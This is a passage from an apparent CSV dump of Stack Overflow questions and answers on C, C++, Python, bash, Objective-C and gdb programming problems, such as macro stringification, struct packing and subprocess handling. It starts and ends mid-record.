#!/bin/python

def printfoo(str):
    print str
</code></pre>

<p>When I try running the bash script, I get a syntax error:</p>

<pre><code>  File ""&lt;string&gt;"", line 1
    import test; test.printfoo($foo)
                               ^
SyntaxError: invalid syntax
</code></pre>
","9530","","<p>You can use <a href=""http://docs.python.org/library/os.html#os.getenv""><code>os.getenv</code></a> to access environment variables from Python:</p>

<pre><code>import os
import test
test.printfoo(os.getenv('foo'))
</code></pre>

<p>However, in order for environment variables to be passed from Bash to any processes it creates, you need to export them with the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Bourne-Shell-Builtins""><code>export</code> builtin</a>:</p>

<pre><code>foo=""hi""
export foo
# Alternatively, the above can be done in one line like this:
# export foo=""hi""

python &lt;&lt;EOF
import os
import test
test.printfoo(os.getenv('foo'))
EOF
</code></pre>

<p>As an alternative to using environment variables, you can just pass parameters directly on the command line.  Any options passed to Python after the <code>-c command</code> get loaded into the <code>sys.argv</code> array:</p>

<pre><code># Pass two arguments 'foo' and 'bar' to Python
python - foo bar &lt;&lt;EOF
import sys
# argv[0] is the name of the program, so ignore it
print 'Arguments:', ' '.join(sys.argv[1:])
# Output is:
# Arguments: foo bar
EOF
</code></pre>
"
"<p>I have created an array of doubles using the following code:</p>

<pre><code>double *points = new double[(ii+1)*(jj+1)*(kk+1)*3];
</code></pre>

<p>I realize that in order to delete the array, all I have to do is:</p>

<pre><code>delete[] points;
</code></pre>

<p>However; the array is created in a function (called create_points) that passes the address of the first element as follows:</p>

<pre><code>return &amp;points[0];
</code></pre>

<p>The code that calls this function then iterates through the address:</p>

<pre><code>double *address = create_points(x_dim,y_dim,z_dim);
for(int k=0; k&lt;x_dim+1; ++k)
    for(int j=0; j&lt;y_dim+1; ++j)
        for(int i=0; i&lt;z_dim+1; ++i) {
            v[p_count].x = *address;
            ++address;
            v[p_count].y = *address;
            ++address;
            v[p_count].z = *address;
            ++address;
            ++p_count;
        }
</code></pre>

<p>Now my question is, how do I properly delete the array of doubles that address is used to access? Can i simply go <code>delete[] address</code>, or do I have to do this some other way?</p>
","9530","","<p>You cannot say <code>delete[] address</code>, doing so is undefined behavior.  You have to delete it through a pointer to the original base address of the array.  So, if you're going to increment the pointer, you need to remember the original pointer (or recompute it):</p>

<pre><code>double *base_address = create_points(...);
double *address = base_address;
// do stuff with address, increment it, etc.
delete [] base_address
</code></pre>
"
"<p>I read following code for deleting pointer object in the open source project <a href=""http://x3c.svn.sourceforge.net/viewvc/x3c/trunk/code/pkg_Core/Interface/UtilFunc/SafeCall.h?revision=218&amp;view=markup"" rel=""nofollow"">X3C</a>. </p>

<pre><code>//! Delete pointer object.
/*!
    \ingroup _GROUP_UTILFUNC
    \param p pointer object created using 'new'.
*/
template&lt;class T&gt;
void SafeDelete(T*&amp; p)
{
    if (p != NULL)
        delete p;
    p = NULL;
    *(&amp;p) = NULL;
}
</code></pre>

<p>But I don't know the meaning of this line:  </p>

<pre><code>*(&amp;p) = NULL;
</code></pre>

<p>In the above line(<strong>p = NULL;</strong>), P is assigned to NULL. I think it's not need to do that again in another way. </p>
","9530","","<p>It's completely pointless.  Under ordinary conditions, the unary <code>*</code> and <code>&amp;</code> operators are inverses of each other (with a few details, like that the expression <code>&amp;*foo</code> is not an lvalue even if <code>foo</code> is an lvalue), although operator overloading can change that behavior.</p>

<p>However, since <code>T*</code> is always a pointer type regardless of the type <code>T</code>, it's impossible to overload the unary <code>operator&amp;</code> for <code>T*</code>, so <code>*(&amp;p)</code> is equivalent to just <code>p</code>, and assigning <code>NULL</code> to <code>p</code> a second time is useless.</p>
"
"<pre><code>def removeDuplicatesFromList(seq): 
    # Not order preserving 
    keys = {}
    for e in seq:
        keys[e] = 1
    return keys.keys()

def countWordDistances(li):
    '''
    If li = ['that','sank','into','the','ocean']    
    This function would return: { that:1, sank:2, into:3, the:4, ocean:5 }
    However, if there is a duplicate term, take the average of their positions
    '''
    wordmap = {}
    unique_words = removeDuplicatesFromList(li)
    for w in unique_words:
        distances = [i+1 for i,x in enumerate(li) if x == w]
        wordmap[w] = float(sum(distances)) / float(len(distances)) #take average
    return wordmap
</code></pre>

<p>How do I make this function faster?</p>
","9530","","<p>Use a <a href=""http://docs.python.org/library/stdtypes.html#set-types-set-frozenset"" rel=""nofollow""><code>frozenset</code></a> instead of a <code>dict</code>, since you're not doing anything with the values:</p>

<pre><code>def removeDuplicatesFromList(seq):
    return frozenset(seq)
</code></pre>
"
"<pre><code>for(NSInteger i = 0; i&lt;[_tempPostalCodeList count]; i++){
            ***if(individualInfo.postalCode == [[_tempPostalCodeList objectAtIndex:i] postalCode])***{
                myAnnotation.title = [NSString stringWithFormat:@""%i Records!"", [[_postalCount objectAtIndex:i] intValue]];
            }
    }
</code></pre>

<p>I Do not know what is wrong with this piece of code. That line has a error.
 This works for Java but not for objective c. =( Someone plz help</p>
","9530","","<p>Despite the lack of a lot of information in the question, my psychic powers tell me that the problem is that the message <code>-objectAtIndex:</code> of the <code>NSArray</code> class returns a generic object of type <code>id</code>.  So, the expression <code>[[_tempPostalCodeList objectAtIndex:i] postalCode]</code> is sending the <code>postalCode</code> message to an object of type <code>id</code>.  Since the compiler doesn't know the underlying type of the actual object, it can't deduce the return type of the <code>postalCode</code> message, so it assumes that it also returns <code>id</code>.</p>

<p><code>id</code> is a pointer type, and since <code>postalCode</code> is an integral type, the compiler thinks you're trying to compare a pointer with an integer when it evaluates the <code>==</code> operator, hence the warning.  The way to fix this is to either insert a cast, or introduce a temporary variable:</p>

<pre><code>// Option #1: Use a cast
if(individualInfo.postalCode ==
    [(MyClass*)[_tempPostalCodeList objectAtIndex:i] postalCode]) {
    ...
}

// Option #2: Use a temporary variable
MyClass *obj = [_tempPostalCodeList objectAtIndex:i];
if(individualInfo.postalCode == obj.postalCode) {
    ...
}
</code></pre>

<p>The reason that you can use a temporary variable without a cast is because the <code>id</code> type (returned by <code>-objectAtIndex:</code>) can be implicitly cast to any Objective-C class type by simple assignment (similar to how in C (but not C++), the <code>void*</code> type can be implicitly cast to any pointer type).</p>
"
"<p>This doesn't work as expected:</p>

<pre><code>#define stringify(x) #x  
printf(""Error at line "" stringify(__LINE__));
</code></pre>

<p>This works:</p>

<pre><code>#define stringify1(x) #x  
#define stringify(x) stringify1(x)  
printf(""Error at line "" stringify(__LINE__));  
</code></pre>

<p>What's the priority that preprocess uses to expand such macros?</p>
","9530","","<p>When expanding a macro, the preprocessor expands the macro's arguments <em>only if those arguments are not subjected to the stringizing (<code>#</code>) or token-pasting (<code>##</code>) operators</em>.  So, if you have this:</p>

<pre><code>#define stringify(x) #x
stringify(__LINE__)
</code></pre>

<p>Then, the preprocessor does <em>not</em> expand <code>__LINE__</code>, because it's the argument of the stringizing operator.  However, when you do this:</p>

<pre><code>#define stringify1(x) #x
#define stringify(x) stringify1(x)
stringify(__LINE__)
</code></pre>

<p>Then, when expanding <code>stringify</code>, the preprocessor expands <code>__LINE__</code> to the current line number, since <code>x</code> is not used with either the stringizing or token-pasting operators in the definition of <code>stringify</code>.  It then expands <code>stringify1</code>, and we get what we wanted.</p>

<p>The relevant language from the C99 standard comes from §6.10.3.1/1:</p>

<blockquote>
  <p>After the arguments for the invocation of a function-like macro have been identified, argument substitution takes place. A parameter in the replacement list, unless preceded by a <code>#</code> or <code>##</code> preprocessing token or followed by a <code>##</code> preprocessing token (see below), is replaced by the corresponding argument after all macros contained therein have been expanded. Before being substituted, each argument’s preprocessing tokens are completely macro replaced as if they formed the rest of the preprocessing file; no other preprocessing tokens are available.</p>
</blockquote>

<p>Clauses §6.10.3.2 and 6.10.3.3 go on to define the behavior of the <code>#</code> and <code>##</code> operators respectively.</p>
"
"<p>I'm trying to write a function in C to solve a math problem. In that function, there are several steps, and each step needs to allocate some memory with the size depending on the calculation results in previous steps (so I can't allocate them all at the beginning of the function). The pseudo code looks like:</p>

<pre><code>int func(){
    int *p1, *p2, *p3, *p4;
    ...

    p1 = malloc(...);
    if(!p1){
        return -1;            //fail in step 1
    }

    ...
    p2 = malloc(...);
    if(!p2){
        free(p1);
        return -2;            //fail in step 2
    }

    ...
    p3 = malloc(...);
    if(!p3){
        free(p1);
        free(p2);
        return -3;            //fail in step 3
    }

    ...
    p4 = malloc(...);
    if(!p4){
        free(p1);
        free(p2);
        free(p3);            /* I have to write too many ""free""s here! */
        return -4;           //fail in step 4
    }

    ...
    free(p1);
    free(p2);
    free(p3);
    free(p4);

    return 0;                //normal exit
}
</code></pre>

<p>The above way to handle malloc failures is so ugly. Thus, I do it in the following way:</p>

<pre><code>int func(){
    int *p1=NULL, *p2=NULL, *p3=NULL, *p4=NULL;
    int retCode=0;
    ...

    /* other ""malloc""s and ""if"" blocks here */

    ...
    p3 = malloc(...);
    if(!p3){
        retCode = -3;            //fail in step 3
        goto FREE_ALL_EXIT;
    }

    ...
    p4 = malloc(...);
    if(!p4){
        retCode = -4;            //fail in step 4
        goto FREE_ALL_EXIT;
    }

    ...
FREE_ALL_EXIT:
    free(p1);
    free(p2);
    free(p3);
    free(p4);

    return retCode;              //normal exit
}
</code></pre>

<p>Although I believe it's more brief, clear, and beautiful now, my team mate is still strongly against the use of 'goto'. And he suggested the following method:</p>

<pre><code>int func(){
    int *p1=NULL, *p2=NULL, *p3=NULL, *p4=NULL;
    int retCode=0;
    ...

    do{

        /* other ""malloc""s and ""if"" blocks here */

        p4 = malloc(...);
        if(!p4){
            retCode = -4;            //fail in step 4
            break;
        }

    ...     
    }while(0);

    free(p1);
    free(p2);
    free(p3);
    free(p4);

    return retCode;              //normal exit
}
</code></pre>

<p>Hmmm, it seems a way to avoid the use of 'goto', but this way increases indents, which makes the code ugly.</p>

<p><strong>So my question is,</strong> is there any other method to handle many 'malloc' failures in a good code style? Thank you all.</p>
","9530","","<p>First of all, there's nothing wrong with goto—this is a perfectly legitimate use of <code>goto</code>.  The <code>do { ... } while(0)</code> with <code>break</code> statements are just gotos in disguise, and it only serves to obfuscate the code.  Gotos are really the best solution in this case.</p>

<p>Another option is to put a wrapper around <code>malloc</code> (e.g. call it <code>xmalloc</code>) which kills the program if <code>malloc</code> fails.  For example:</p>

<pre><code>void *xmalloc(size_t size)
{
    void *mem = malloc(size);
    if(mem == NULL)
    {
        fprintf(stderr, ""Out of memory trying to malloc %zu bytes!\n"", size);
        abort();
    }
    return mem;
}
</code></pre>

<p>Then use <code>xmalloc</code> everywhere in place of <code>malloc</code>, and you no longer need to check the return value, since it will return a valid pointer if it returns at all.  But of course, this is only usable if you want allocation failures to be an <em>unrecoverable</em> failure.  If you want to be able to recover, then you really do need to check the result of every allocation (though honestly, you'll probably have another failure very soon after).</p>
"
"<p>I have two problems, the first has been solved.</p>

<p><strong>Current problem</strong><br>
If I embed a file that requires a library to load it, such as a jpeg image or a mp3 music, I will need to use the file as input to the library. However, each library is different and uses a way to get a file as input, the input may be the file name or a FILE* pointer (from libc's file interface).</p>

<p>I would like to know how to access an embedded file with a name. It will be inefficient if I create a temporary file, is there another way? Can I map a file name to memory? My platforms are Windows and Linux.</p>

<p>If <strong>show_file(const char* name)</strong> is a function from a library, I will need a string to open the file.<br>
I have seen these questions:<br>
<a href=""http://stackoverflow.com/questions/1558772/how-to-get-file-descriptor-of-buffer-in-memory"">How to get file descriptor of buffer in memory?</a><br>
<a href=""http://stackoverflow.com/questions/1188757/getting-filename-from-file-descriptor-in-c"">Getting Filename from file descriptor in C</a></p>

<p>and the following code is my solution. Is it a good solution? Is it inefficient?</p>

<pre><code># include &lt;stdio.h&gt;
# include &lt;unistd.h&gt;

extern char _binary_data_txt_start;
extern const void* _binary_data_txt_size;
const size_t len = (size_t)&amp;_binary_data_txt_size;

void show_file(const char* name){
    FILE* file = fopen(name, ""r"");
    if (file == NULL){
        printf(""Error (show_file): %s\n"", name);
        return;
    }

    while (true){
        char ch = fgetc(file);
        if (feof(file) )
            break;
        putchar( ch );
    }
    printf(""\n"");

    fclose(file);
}

int main(){

    int fpipe[2];
    pipe(fpipe);

    if( !fork() ){
        for( int buffsize = len, done = 0; buffsize&gt;done; ){
            done += write( fpipe[1], &amp;_binary_data_txt_start + done, buffsize-done );
        }
        _exit(0);
    }

    close(fpipe[1]);
    char name[200];
    sprintf(name, ""/proc/self/fd/%d"", fpipe[0] );

    show_file(name);

    close(fpipe[0]);
}
</code></pre>

<hr>

<p><strong>The other problem (solved)</strong><br>
I tried to embed a file on Linux, with GCC, and it worked. However, I tried to do the same thing on Windows, with Mingw, and it did not compile.</p>

<p>The code is:</p>

<pre><code># include &lt;stdio.h&gt;

extern char _binary_data_txt_start;
extern char _binary_data_txt_end;

int main(){
    for (char* my_file = &amp;_binary_data_txt_start; my_file &lt;= &amp;_binary_data_txt_end; my_file++)
        putchar(*my_file);
    printf(""\n"");
}
</code></pre>

<p>The compilation commands are:</p>

<pre><code>objcopy --input-target binary --output-target elf32-i386 --binary-architecture i386 data.txt data.o
g++ main.cpp data.o -o test.exe
</code></pre>

<p>On Windows, I get the following compiler error:</p>

<pre><code>undefined reference to `_binary_data_txt_start'
undefined reference to `_binary_data_txt_end'
</code></pre>

<p>I tried to replace <strong>elf32-i386</strong> with <strong>i386-pc-mingw32</strong>, but I still get the same error.</p>
","9530","","<p>If you're using a library that requires a <code>FILE*</code> for reading data, then you can use <a href=""http://linux.die.net/man/3/fmemopen""><code>fmemopen(3)</code></a> to create a pseudofile out of a memory blob.  This will avoid creating a temporary file on disk.  Unfortunately, it's a GNU extension, so I don't know if it's available with MinGW (likely not).</p>

<p>However, most well-written libraries (such as <a href=""http://www.libpng.org/pub/png/libpng.html"">libpng</a> and the <a href=""http://www.ijg.org/"">IJG's JPEG library</a>) provide routines for opening a file from memory as opposed to from disk.  libpng, in particular, even offers a streaming interface, where you can incrementally decode a PNG file before it's been completely read into memory.  This is useful if, say, you're streaming an interlaced PNG from the network and you want to display the interlaced data as it loads for a better user experience.</p>
"
"<p>I would like to reference a variable that I have in a bash script ""value"" as well as ""max."" As of now, I have a text interface in which after given commands, the terminal window displays something similar to</p>

<blockquote>
  <p>==========================================================================> 100%</p>
</blockquote>

<p>for a progress bar. The variable is referenced throughout the script, and I would like to call that variable in my cocoa app.</p>

<p>Thanks in advance!</p>
","9530","","<p>Your question isn't entirely clear, but it sounds like you want to use environment variables.  In bash, you need to use the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Bourne-Shell-Builtins"" rel=""nofollow""><code>export</code> builtin</a> to mark a variable to be exported to child processes.  Then, in your Cocoa app, you can use <a href=""http://developer.apple.com/library/ios/#documentation/system/conceptual/manpages_iphoneos/man3/getenv.3.html"" rel=""nofollow""><code>getenv(3)</code></a> function to retrieve the environment variable value.  For example:</p>

<pre><code># In your bash script
value=foo
max=bar
export value max

// Now in your Cocoa application:
char *value;
if((value = getenv(""value"")))
{
    // Use value
}
// else value is not in the environment
</code></pre>
"
"<p>This produces an incompatibility warning:</p>

<pre><code>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;

typedef struct
{
  int key;
  int data;
  struct htData_* next;
  struct htData_* prev;
}htData_;

typedef struct
{
  int num_entries;
  struct htData_** entries;
}ht_;

ht_* new_ht(int num_entries);
int ht_add(ht_* ht_p, int key, int data);

int main()
{
  int num_entries = 20;
  //crate a hash table and corresponding reference                                                                                                              
  ht_* ht_p = new_ht(num_entries);
  //add data to the hash table                                                                                                                                  
  int key = 1305;
  ht_add(ht_p,key%num_entries,20);

  return 0;
}

ht_* new_ht(int num_entries)
{
  ht_ *ht_p;
  ht_ ht;
  ht.num_entries = num_entries;
  ht_p = &amp;ht;

  //create an array of htData                                                                                                                                   
  htData_ *htDataArray;
  htDataArray = (htData_*) malloc(num_entries * sizeof(htData_));
  //point to the pointer that points to the first element in the array                                                                                          
  ht.entries = &amp;htDataArray; // WARNING HERE!!!!!!!!!!!!!!!!

  return ht_p;
}
</code></pre>

<p>I'm trying to copy the <code>**ptr</code> to the <code>struct</code> containing a <code>**ptr</code>.</p>

<p><strong>Update:</strong> My simplified code was not accurate so I've posted the actual code.</p>
","9530","","<p>The problem is that <code>struct htData_</code> and <code>htData_</code> are <em>not</em> the same thing!  As far as the compiler is concerned, <code>struct htData_</code> doesn't exist—it's an incomplete type.  <code>htData_</code>, on the other hand, is a <code>typedef</code> for an anonymous structure.  For a more detailed analysis, see <a href=""http://stackoverflow.com/questions/612328/difference-between-struct-and-typedef-struct-in-c/612350#612350"">Difference between <code>struct</code> and <code>typedef struct</code> in C++</a>.</p>

<p>So, you're getting a warning because <code>ht.entries</code> is declared as the type <code>struct htData_**</code>, but the right-hand side of that assignment has type <code>&lt;anonymous struct&gt;**</code>.  To fix this, you need to define <code>struct htData_</code>:</p>

<pre><code>typedef struct htData_
{
    ...
} htData_;
</code></pre>
"
"<p>According to the documentation I can break on specific exception type by using conditional breakpoints. However the syntax for the condition isn't very clear to me:</p>

<pre><code>condition bnum &lt;expression&gt;
</code></pre>

<p>Looking at the expression syntax I think this is the pattern I need:</p>

<blockquote>
  <p><code>{type} addr</code></p>
</blockquote>

<p>However, I don't know what I should pass for the <code>addr</code> argument. I tried the following:</p>

<pre><code>(gdb) catch throw
(gdb) condition 1 boost::bad_function_call *
</code></pre>

<p>But it doesn't work (gdb breaks on all exception types).</p>

<p>Can anyone help?</p>

<p><hr/><h3>Update</h3>
I also tried @Adam's suggestion, but it results in an error message:</p>

<pre><code>(gdb) catch throw boost::bad_function_call
Junk at end of arguments.
</code></pre>

<p>Without <code>boost::</code> namespace:</p>

<pre><code>(gdb) catch throw bad_function_call
Junk at end of arguments.
</code></pre>

<p><hr/><h3>Workaround</h3>
Breaking in the constructor of <code>bad_function_call</code> works.</p>
","9530","","<p><strong>EDIT</strong></p>

<p>The documentation suggests that <code>catch throw &lt;exceptname&gt;</code> can be used to break whenever an exception of type <code>&lt;exceptname&gt;</code> is thrown; however, that doesn't seem to work in practice.</p>

<pre><code>(gdb) help catch
Set catchpoints to catch events.
Raised signals may be caught:
        catch signal              - all signals
        catch signal &lt;signame&gt;    - a particular signal
Raised exceptions may be caught:
        catch throw               - all exceptions, when thrown
        catch throw &lt;exceptname&gt;  - a particular exception, when thrown
        catch catch               - all exceptions, when caught
        catch catch &lt;exceptname&gt;  - a particular exception, when caught
Thread or process events may be caught:
        catch thread_start        - any threads, just after creation
        catch thread_exit         - any threads, just before expiration
        catch thread_join         - any threads, just after joins
Process events may be caught:
        catch start               - any processes, just after creation
        catch exit                - any processes, just before expiration
        catch fork                - calls to fork()
        catch vfork               - calls to vfork()
        catch exec                - calls to exec()
Dynamically-linked library events may be caught:
        catch load                - loads of any library
        catch load &lt;libname&gt;      - loads of a particular library
        catch unload              - unloads of any library
        catch unload &lt;libname&gt;    - unloads of a particular library
The act of your program's execution stopping may also be caught:
        catch stop

C++ exceptions may be caught:
        catch throw               - all exceptions, when thrown
        catch catch               - all exceptions, when caught
Ada exceptions may be caught:
        catch exception           - all exceptions, when raised
        catch exception &lt;name&gt;    - a particular exception, when raised
        catch exception unhandled - all unhandled exceptions, when raised
        catch assert              - all failed assertions, when raised

Do ""help set follow-fork-mode"" for info on debugging your program
after a fork or vfork is caught.

Do ""help breakpoints"" for info on other commands dealing with breakpoints.
</code></pre>
"
"<p>I am working on a windows service written in C++ using vs2005 and I'm running into a problem.</p>

<p>The service must launch an other small executable and get it's output. I do that through a call to CreateProcess (well a library does that for me actually (libexecstream) ), it works.</p>

<p>The executable being launched, is somewhere on the disk, I don't know where, and it's directory is in the path environment variable. My service just launch ""theTool.exe"" and here we go.<br>
If the path variable looks like this: <code>smting;smthingelse;C:\Program Files\blah\bin;meow</code> it works.<br>
But if the path looks like this: <code>smting;smthingelse;%ProgramFiles%\blah\bin;meow</code> it no longer works!</p>

<p>The problem is, on some machines it looks like the first, on others like the second...<br>
The funny thing is that if I launch it in a console (as opposed to as a service) it works fine!</p>

<p>Is there a way to avoid that problem? programatically? 
A solution like changing it by hands is not an option (the client doesn't want it). Changing it in the install script or something like that is not an option either because the path might be changed afterwards.<br>
And modifying the tool is not an option either because we didn't do it and we don't have the source code.</p>

<p><strong>edit:</strong>
the CreateProcess line looks like this:</p>

<pre><code>STARTUPINFO si;
ZeroMemory( &amp;si, sizeof( si ) );
si.cb=sizeof( si );
si.hStdError = err.w();
si.hStdOutput = out.w();
si.hStdInput = in.r();
si.dwFlags |= STARTF_USESTDHANDLES;
PROCESS_INFORMATION pi;
ZeroMemory( &amp;pi, sizeof( pi ) );
if( !CreateProcess( 0, const_cast&lt; char * &gt;( command.c_str() ), 0, 0, TRUE, 0, 0, 0, &amp;si, &amp;pi ) ) {
throw os_error_t( ""exec_stream_t::start: CreateProcess failed.\n command line was: ""+command );
}
</code></pre>

<p>where <code>command</code> is ""theTool""</p>

<p><strong>2nd edit</strong>: if my program is launched as a service it fails, if it is launched in a console it workds </p>
","9530","","<p>Instead of using <code>CreateProcess</code>, you could instead <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2011/07/25/10189298.aspx"" rel=""nofollow"">use the <code>App Paths</code> registry key</a> and launch the application with <a href=""http://msdn.microsoft.com/en-us/library/bb762153%28v=vs.85%29.aspx"" rel=""nofollow""><code>ShellExecute</code></a>.  This avoids polluting the <code>PATH</code> environment variable.</p>
"
"<p>The following struct <code>X</code> has 3 bytes of payload and 1 byte of padding:</p>

<pre><code>struct X
{
    short a;
    char b;
};

memory layout: aab.
</code></pre>

<p>The following struct <code>Y</code> has 4 bytes of payload and 2 byte of padding:</p>

<pre><code>struct Y
{
    X x;
    char c;
};

memory layout: aab.c.
</code></pre>

<p>Is there any way to keep <code>X</code> nested inside of <code>Y</code> and have <code>sizeof(X) == 4 &amp;&amp; sizeof(Y) == 4</code>?</p>

<pre><code>memory layout: aabc
</code></pre>

<p>Ideally, I would want this kind of space optimization for all types <code>X</code> (think <code>X</code> as a template parameter).</p>
","9530","","<p>Yes, but it's not standard C/C++ and requires compiler-specific extensions.  For MSVC, use the <a href=""http://msdn.microsoft.com/en-us/library/2e70t5y1%28v=vs.80%29.aspx"" rel=""nofollow""><code>pack</code> pragma</a>:</p>

<pre><code>#pragma pack(push, 1)
struct X 
{
    ...
};
#pragma pack(pop)
</code></pre>

<p>For GCC, use the <a href=""http://gcc.gnu.org/onlinedocs/gcc/Type-Attributes.html"" rel=""nofollow""><code>packed</code> type attribute</a>:</p>

<pre><code>struct __atribute__((packed)) X
{
    ...
};
</code></pre>

<p>With some preprocessor macros and the <a href=""http://msdn.microsoft.com/en-us/library/d9x1s805%28v=VS.80%29.aspx"" rel=""nofollow""><code>__pragma</code> token</a>, you can make a definition work in both compilers without requiring a bunch of <code>#if</code> conditionals.</p>
"
"<p>For some reason i can't figure i am getting access violation.</p>

<pre><code>memcpy_s (buffer, bytes_per_line * height, image, bytes_per_line * height);
</code></pre>

<p>This is whole function:</p>

<pre><code>int Flip_Bitmap(UCHAR *image, int bytes_per_line, int height)   
{   
    // this function is used to flip bottom-up .BMP images   

    UCHAR *buffer; // used to perform the image processing   
    int index;     // looping index   

    // allocate the temporary buffer   
    if (!(buffer = (UCHAR *) malloc (bytes_per_line * height)))   
        return(0);   

    // copy image to work area   
    //memcpy(buffer, image, bytes_per_line * height);   
    memcpy_s (buffer, bytes_per_line * height, image, bytes_per_line * height);

    // flip vertically   
    for (index = 0; index &lt; height; index++)   
        memcpy(&amp;image[((height - 1) - index) * bytes_per_line], &amp;buffer[index * bytes_per_line], bytes_per_line);   

    // release the memory   
    free(buffer);   

    // return success   
    return(1);   

} // end Flip_Bitmap   
</code></pre>

<p>Whole code:
<a href=""http://pastebin.com/udRqgCfU"" rel=""nofollow"">http://pastebin.com/udRqgCfU</a></p>

<p>To run this you'll need 24-bit bitmap, in your source directory.
This is a part of a larger code, i am trying to make Load_Bitmap_File function to work...
So, any ideas?</p>
","9530","","<p>You're getting an access violation because <strong>a lot of image programs don't set <code>biSizeImage</code> properly</strong>.  The image you're using probably has <code>biSizeImage</code> set to 0, so you're not allocating any memory for the image data (in reality, you're probably allocating 4-16 bytes, since most <code>malloc</code> implementations will return a non-<code>NULL</code> value even when the requested allocation size is 0).  So, when you go to copy the data, you're reading past the ends of that array, which results in the access violation.</p>

<p>Ignore the <code>biSizeImage</code> parameter and compute the image size yourself.  Keep in mind that the size of each scan line must be a multiple of 4 bytes, so you need to round up:</p>

<pre><code>// Pseudocode
#define ROUNDUP(value, power_of_2) (((value) + (power_of_2) - 1) &amp; (~((power_of_2) - 1)))
bytes_per_line = ROUNDUP(width * bits_per_pixel/8, 4)
image_size = bytes_per_line * height;
</code></pre>

<p>Then just use the same image size for reading in the image data and for flipping it.</p>
"
"<p>After a search, and some test runs both os.popen()+read() and subprocess.check_output() seem to be almost equivalent for reading out the contents of a folder. Is there a way to improve either a combination of os.popen()+read() or subprocess.check_output()? I have to <code>ls</code> a number of folders and read the outputs, and using either of the above is similar, but represents the major bottleneck according to profiling results.</p>
","9530","","<p>Why don't you just read the directory contents directly with <a href=""http://docs.python.org/library/os.html#os.listdir"" rel=""nofollow""><code>os.listdir</code></a>?  Why do you need to shell out to <code>ls</code>?  If you need more information about files in addition to just the filenames, you can also use <a href=""http://docs.python.org/library/os.html#os.stat"" rel=""nofollow""><code>os.stat</code></a>.  It's much more efficient to do the system calls yourself than to create subprocesses to do it for you.</p>

<p>For doing entirely directory traversals, there's <a href=""http://docs.python.org/library/os.html#os.walk"" rel=""nofollow""><code>os.walk</code></a>.  The <a href=""http://docs.python.org/library/shutil.html"" rel=""nofollow""><code>shutil</code> module</a> also has some useful functions.</p>
"
"<p>I am using python to create a sub process to check and see that no assertions occur. </p>

<p>I want to catch the error output along with the return code. That works fine, but the problem I run into is that when it runs into the assertion it gives me a dialog box that just hangs there. I have to then click the assertion box before I retrieve any information. Is there a way to make it not pop up and continue with the program or to send a message to close the window? </p>

<p>This is a problem since this is an automation service.</p>

<pre><code>import subprocess

pipe = subprocess.Popen('test2.exe', shell=True, stderr=subprocess.PIPE)

for line in pipe.stderr:
    print line
</code></pre>

<p>The executable is compiled from c++ code and has an assertion that will fail for testing purposes.</p>
","9530","","<p>There's not really an easy solution in general, since a program could in theory create any number of windows waiting for user input.  If you have the source code for the inferior process, the easiest thing to do would be to modify it to call <a href=""http://msdn.microsoft.com/en-us/library/e631wekh%28v=vs.80%29.aspx"" rel=""nofollow""><code>_set_abort_behavior(0, _CALL_REPORTFAULT)</code></a> to disable the message box.</p>

<p>If you don't have the source code, it's going to be much, much tougher.  You could probably write a big hack that did something like attaching a debugger to the inferior process and setting a breakpoint on the call to <code>abort()</code>.  If that breakpoint gets hit, kill the process and return an appropriate error status.  But that's an extreme non-trivial kludge.</p>
"
"<p>when I'm trying to call a method on an object of type id, i get a warning raised (method not found). Of course not, but isn't that the sense of an id object?  </p>

<p>Is there a way to <strong>tell the compiler:<br>
""You don't now the class of the object on which i am calling this method, but don't worry, i'm sure it does implement it!""</strong> ?</p>
","9530","","<p>Yes, just use a variable of the proper class type.  You can either perform an explicit cast when sending the message, or you can assign it to a variable of the correct type.  In Objective-C, the type <code>id</code> can be implicitly cast to any Objective-C object pointer type:</p>

<pre><code>id myId = ...;

// Option 1: Use a cast when sending the message
[(MyClass *)myId someClassMethod];

// Option 2: Assign to a variable
MyClass *myObj = miId;  // Implicit cast in the assignment
[myObj someClassMethod];
</code></pre>
"
"<p>I have the following template function:</p>

<pre><code>  template &lt;typename N&gt;
  inline N findInText(std::string line, std::string keyword)
  {
    keyword += "" "";
    int a_pos = line.find(keyword);
    if (a_pos != std::string::npos)
    {
      std::string actual = line.substr(a_pos,line.length());
      N x;
      std::istringstream (actual) &gt;&gt; x;
      return x;
    }
    else return -1; // Note numbers read from line must be always &lt; 1 and &gt; 0
  }
</code></pre>

<p>It seems like the line:</p>

<pre><code> std::istringstream (actual) &gt;&gt; x;
</code></pre>

<p>Doesn't work.
However the same function not templated:</p>

<pre><code>    int a_pos = line.find(""alpha "");
    if (a_pos != std::string::npos)
    {
      std::string actual = line.substr(a_pos,line.length());
      int x;
      std::istringstream (actual) &gt;&gt; x;
      int alpha = x;
    }
</code></pre>

<p>Works just fine.
Is it an issue with std::istringstream and templates ???</p>

<p>I am looking for a way to read configuration files and load parameters which can be int or real.</p>

<p>EDIT solution:</p>

<pre><code>template &lt;typename N&gt;
  inline N findInText(std::string line, std::string keyword)
  {
    keyword += "" "";
    int a_pos = line.find(keyword);
    int len = keyword.length();
    if (a_pos != std::string::npos)
    {
      std::string actual = line.substr(len,line.length());
      N x;
      std::istringstream (actual) &gt;&gt; x ;
      return x;
    }
    else return -1;
  }
</code></pre>
","9530","","<p>It doesn't work because the string you're reading in can't be converted to a number, so you're returning uninitialized garbage.  That's happening because you're reading in the wrong string -- if <code>line</code> is <code>foo bar 345</code> and <code>keyword</code> is <code>bar</code>, then <code>actual</code> gets set to <code>bar 345</code>, which doesn't convert to an integer.  You instead want to convert <code>345</code>.</p>

<p>You should rewrite your code like this:</p>

<pre><code>    std::string actual = line.substr(a_pos + keyword.length());
    N x;
    if (std::istringstream (actual) &gt;&gt; x)
        return x;
    else
        return -1;
</code></pre>

<p>That way, you convert the proper substring, and you also properly handle the case when that can't be converted to an integer.</p>
"
"<p>Using the Graph Facebook API with this code</p>

<pre><code>[facebook requestWithGraphPath:@""me/friends"" andDelegate:self]; 
</code></pre>

<p>Now I have an NSDictionary which is like this:</p>

<pre><code>{data =     (
            {
        id = 123456;
        name = ""Mark Zuckerberg"";
    },
            {
        id = 654321;
        name = ""Steve Jobs"";
    },
            {
        id = 13579;
        name = ""Bill Gates"";
    }
    ...
  );
}
</code></pre>

<p>I want to sort this NSDictionary, but I know that is not possible.
Of course, I can create 2 NSArray (or NSMutableArray), one ""array_id"" and the other one ""array_name"".
I'd like to sort ""array_name"", but keeping the reference to the id.</p>

